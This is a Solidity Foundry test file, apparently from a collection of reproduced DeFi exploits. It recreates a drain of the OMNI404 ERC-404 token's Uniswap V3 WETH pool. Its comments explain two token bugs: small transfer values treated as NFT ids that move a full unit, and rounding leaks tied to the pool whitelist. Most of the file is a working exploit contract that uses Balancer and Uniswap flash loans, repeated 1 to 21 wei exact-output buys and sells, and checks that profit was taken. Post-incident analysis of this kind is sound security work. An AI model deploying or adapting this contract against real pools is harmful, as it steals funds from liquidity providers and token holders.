// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~2.4–3.02 WETH
// Attacker EOA        : 0xFB26db4EAb18Cb50d29Ff431888dD643A7e9C9f8
// Attack contract      : 0x505B2EBea0EC6e30D02768f1de8DdE8Dd9122aD4
// Victim token         : 0xd5C02bB3e40494D4674778306Da43a56138A383E  OMNI404 (O404)
// Victim pool          : 0xB3f613b9Bc84ddB29D78fA4685b01d98412BBa0b  UniV3 WETH/O404 1%
// Main attack tx       : https://etherscan.io/tx/0x4cbc3d8db832eb5442ce1c11d79fda05cafabfe7906933ed25881d60bf41d6f3
// Follow-up drain txs  : 0x8fb27ec50d30655c2716f5b45dd67f0425e27fb4eec8c7d8f1c42505905740d8
//                        0xaf873efbe163db363d998e7a9ea165d9dd9cb2182016103ae2ff91f35665cc9f
//                        0xc38dd1a7916d20248c927bd4123407d33815130e3a31b89f93a69ef21f3c6d96
// Chain / block / date : Ethereum · 25951648 · 2026-09-11
// Alerts               : https://x.com/SlowMist_Team/status/2098300936720695573
//                        https://x.com/exvulsec/status/2098273797753405607
//
// Root cause (two cooperating bugs in O404):
// 1. `transfer(to, valueOrId)` treats valueOrId <= 50 (maxTotalSupplyERC721) as an
//    ERC-721 id and also moves a full `units` (1e18) of ERC-20. UniV3 exact-output
//    swaps of 1..21 wei therefore deliver 1e18 O404 while the pool accounts wei.
// 2. `_transfer` mints/burns NFTs from floor(balance/units) and SKIPS both sides
//    for `whitelist[pool]`. Buy/sell across a unit boundary leaks rounding into
//    the NFT bank (unbacked ids) while WETH is extracted from the pair.

address constant ATTACKER = 0xFB26db4EAb18Cb50d29Ff431888dD643A7e9C9f8;
address constant O404 = 0xd5C02bB3e40494D4674778306Da43a56138A383E;
address constant POOL = 0xB3f613b9Bc84ddB29D78fA4685b01d98412BBa0b;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant BALANCER = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

uint256 constant FORK_BLOCK = 25_951_647; // one before the drain block
uint160 constant MIN_SQRT_RATIO_PLUS_ONE = 4_295_128_740;
uint160 constant MAX_SQRT_RATIO_MINUS_ONE = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IO404 {
    function transfer(address to, uint256 valueOrId) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function ownerOf(uint256 id) external view returns (address);
    function minted() external view returns (uint256);
    function whitelist(address) external view returns (bool);
    function units() external view returns (uint256);
    function erc721BalanceOf(address) external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract OMNI404Erc404Rounding_exp is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = WETH;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(O404, "OMNI404");
        vm.label(POOL, "UniV3 WETH/O404 1%");
        vm.label(WETH, "WETH");
        vm.label(BALANCER, "Balancer Vault");
    }

    function testExploit() public balanceLog {
        uint256 poolO404Before = IERC20(O404).balanceOf(POOL);
        uint256 poolWethBefore = IERC20(WETH).balanceOf(POOL);
        emit log_named_decimal_uint("Pool O404 before", poolO404Before, 18);
        emit log_named_decimal_uint("Pool WETH before", poolWethBefore, 18);
        emit log_named_uint("minted before", IO404(O404).minted());
        emit log_named_uint("pool whitelisted", IO404(O404).whitelist(POOL) ? 1 : 0);

        OMNI404Exploit exploit = new OMNI404Exploit(ATTACKER);
        vm.deal(address(exploit), 0);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(WETH).balanceOf(ATTACKER);
        emit log_named_decimal_uint("Attacker WETH+ETH profit", profit, 18);
        emit log_named_decimal_uint("Pool O404 after", IERC20(O404).balanceOf(POOL), 18);
        emit log_named_decimal_uint("Pool WETH after", IERC20(WETH).balanceOf(POOL), 18);
        emit log_named_uint("minted after", IO404(O404).minted());

        require(profit > 1 ether, "profit too low");
        require(IERC20(WETH).balanceOf(POOL) < poolWethBefore, "pool WETH not drained");
    }
}

contract OMNI404Exploit {
    address private immutable profitReceiver;
    uint256 private wethFlash;
    uint256 private o404Flash;
    bool private inO404Flash;

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");

        address[] memory tokens = new address[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 5 ether;
        wethFlash = 5 ether;
        IBalancerVault(BALANCER).flashLoan(address(this), tokens, amounts, "");

        uint256 w = IERC20(WETH).balanceOf(address(this));
        if (w > 0) IERC20(WETH).transfer(profitReceiver, w);
        uint256 o = IERC20(O404).balanceOf(address(this));
        if (o > 0) IERC20(O404).transfer(profitReceiver, o);
    }

    function receiveFlashLoan(address[] memory, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory)
        external
    {
        require(msg.sender == BALANCER, "not balancer");

        // step 1: tiny ERC-20 buy so we have fee dust, then flash the pool's O404.
        // Flash mints NFTs from the bank (pool is whitelisted so it does not burn).
        try this.buyExactO404(0.2 ether) {} catch {}
        uint256 poolO404 = IERC20(O404).balanceOf(POOL);
        o404Flash = 15 ether < poolO404 ? 15 ether : poolO404 * 70 / 100;
        IUniswapV3Pool(POOL).flash(address(this), 0, o404Flash, "o404");

        // step 3: pool is unlocked. Exact-output 1..21 wei of O404.
        // Pool.transfer(recipient, i) hits the NFT-id branch (i <= 50) and
        // delivers `units` (1e18) while UniV3 accounts only i wei.
        for (uint256 i = 1; i <= 21; i++) {
            try this.buyExactO404(i) {} catch {}
        }

        // step 4: sell a large O404 chunk into the AMM (historical: 19.8 O404)
        uint256 sellAmt = IERC20(O404).balanceOf(address(this));
        if (sellAmt > 1 ether) {
            uint256 dump = 19.8 ether < sellAmt ? 19.8 ether : sellAmt - 0.2 ether;
            try this.sellO404(dump) {} catch {}
        }

        // more drain passes (historical: run + 3x drain)
        for (uint256 p = 0; p < 3; p++) {
            for (uint256 i = 1; i <= 21; i++) {
                try this.buyExactO404(i) {} catch {}
            }
            sellAmt = IERC20(O404).balanceOf(address(this));
            if (sellAmt > 1 ether) {
                uint256 dump = sellAmt > 1.2 ether ? sellAmt - 0.2 ether : sellAmt / 2;
                try this.sellO404(dump) {} catch {}
            }
        }

        uint256 repayWeth = amounts[0] + feeAmounts[0];
        IERC20(WETH).transfer(BALANCER, repayWeth);
    }

    function uniswapV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        require(msg.sender == POOL, "not pool");

        // step 2: seed each owned id onto the pool via transfer(pool, id).
        // This ALSO moves 1e18 ERC-20, returning the flashed principal so the
        // pool's ERC-20 balance can repay the flash. UniV3 is locked here (LOK)
        // so we must not swap until this callback returns.
        _seedNftsToPool();

        uint256 repay = o404Flash + fee1;
        uint256 have = IERC20(O404).balanceOf(address(this));
        if (have < repay) {
            // principal already sits on the pool from NFT-path transfers;
            // send whatever dust we kept for the 1% flash fee
            repay = have;
        }
        IERC20(O404).transfer(POOL, repay);
    }

    function buyExactO404(uint256 amountOut) external {
        require(msg.sender == address(this), "self");
        _swap(true, -int256(amountOut), MIN_SQRT_RATIO_PLUS_ONE);
    }

    function sellO404(uint256 amountIn) external {
        require(msg.sender == address(this), "self");
        _swap(false, int256(amountIn), MAX_SQRT_RATIO_MINUS_ONE);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == POOL, "not pool");
        if (amount0Delta > 0) IERC20(WETH).transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) IERC20(O404).transfer(msg.sender, uint256(amount1Delta));
    }

    function _seedNftsToPool() internal {
        uint256 minted = IO404(O404).minted();
        if (minted > 50) minted = 50;
        for (uint256 id = 1; id <= minted; id++) {
            try IO404(O404).ownerOf(id) returns (address own) {
                if (own == address(this)) {
                    // NFT path: move 1e18 ERC-20 + the id to the pool
                    IO404(O404).transfer(POOL, id);
                }
            } catch {}
        }
    }

    function _roundingLoop(uint256 n) internal {
        // Cross the whole-unit boundary repeatedly. Pool is whitelisted so
        // mint/burn on the pool side is skipped; attacker floor() mint/burn
        // is not conserved across a buy→sell round-trip.
        for (uint256 i = 0; i < n; i++) {
            uint256 before = IERC20(O404).balanceOf(address(this));
            uint256 frac = before % 1 ether;
            uint256 buyAmt = frac > 0.5 ether ? uint256(0.1 ether) : uint256(0.6 ether);
            try this.buyExactO404(buyAmt) {} catch { break; }
            uint256 afterBuy = IERC20(O404).balanceOf(address(this));
            uint256 sellAmt = afterBuy > before ? afterBuy - before : 0;
            if (sellAmt > 0 && sellAmt < afterBuy) {
                _swap(false, int256(sellAmt), MAX_SQRT_RATIO_MINUS_ONE);
            }
        }
    }

    function _swap(bool zeroForOne, int256 amountSpecified, uint160 limit) internal {
        IUniswapV3Pool(POOL).swap(address(this), zeroForOne, amountSpecified, limit, "");
    }

    receive() external payable {}
}
